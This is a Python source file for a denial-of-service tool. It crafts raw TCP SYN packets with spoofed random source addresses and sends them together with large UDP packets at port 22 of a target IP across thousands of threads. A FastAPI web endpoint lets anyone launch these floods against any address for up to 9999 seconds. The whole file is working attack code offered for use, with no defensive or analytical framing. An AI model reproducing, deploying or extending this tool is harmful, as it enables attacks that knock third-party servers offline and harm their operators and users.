import socket
import random
import threading
from datetime import datetime, timedelta
import struct
from fastapi import FastAPI, HTTPException
import uvicorn

app = FastAPI()

# สร้าง SYN Packet
def create_syn_packet(source_ip, dest_ip, source_port, dest_port):
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        69,  # Version & IHL
        0,  # Type of Service
        40,  # Total Length
        random.randint(1, 65535),  # Identification
        0,  # Flags & Fragment Offset
        64,  # TTL
        socket.IPPROTO_TCP,  # Protocol
        0,  # Header Checksum
        socket.inet_aton(source_ip),
        socket.inet_aton(dest_ip),
    )
    tcp_header = struct.pack(
        '!HHLLBBHHH',
        source_port,
        dest_port,
        random.randint(0, 4294967295),  # Sequence Number
        0,  # Acknowledgment Number
        80,  # Data Offset & Reserved
        2,  # Flags (SYN)
        8192,  # Window Size
        0,  # Checksum
        0,  # Urgent Pointer
    )
    return ip_header + tcp_header

# TCP SYN Flood
def syn_flood(target_ip, duration):
    end_time = datetime.now() + timedelta(seconds=duration)

    def attack():
        while datetime.now() < end_time:
            try:
                source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                source_port = random.randint(1024, 65535)
                packet = create_syn_packet(source_ip, target_ip, source_port, 22)
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                s.sendto(packet, (target_ip, 22))
            except Exception:
                pass

    return attack

# UDP Flood
def udp_flood(target_ip, duration):
    end_time = datetime.now() + timedelta(seconds=duration)

    def attack():
        payload = random._urandom(65507)  # Maximum UDP packet size
        while datetime.now() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (target_ip, 22))
            except Exception:
                pass
            finally:
                s.close()

    return attack

# Combined Attack
def combined_attack(target_ip, duration, threads):
    print(f"Starting Combined Attack on {target_ip} for {duration} seconds with {threads} threads.")
    tcp_attack = syn_flood(target_ip, duration)
    udp_attack = udp_flood(target_ip, duration)

    for _ in range(threads):
        threading.Thread(target=tcp_attack).start()
        threading.Thread(target=udp_attack).start()

@app.get("/")
def attack(ip: str, time: int, threads: int = 2000):
    if time > 9999:
        raise HTTPException(status_code=400, detail="Duration cannot exceed 9999 seconds")
    if threads > 10000:
        raise HTTPException(status_code=400, detail="Threads cannot exceed 10000")

    threading.Thread(target=combined_attack, args=(ip, time, threads)).start()

    return {
        "status": "success",
        "message": f"Combined attack started on {ip}:22 for {time} seconds with {threads} threads"
    }

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
